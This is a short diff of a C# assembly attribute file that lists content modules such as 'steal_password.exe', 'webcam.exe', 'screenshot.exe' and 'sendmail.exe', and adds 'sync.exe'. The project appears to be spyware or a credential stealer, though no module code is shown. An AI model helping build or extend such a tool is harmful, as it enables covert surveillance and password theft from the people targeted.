@@ -14,6 +14,7 @@
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/screenshot.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sendmail.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/steal_password.exe")]
+[assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sync.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/sync_up.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/webcam.exe")]
 [assembly: System.Windows.Resources.AssemblyAssociatedContentFileAttribute("module/website_usage.exe")]
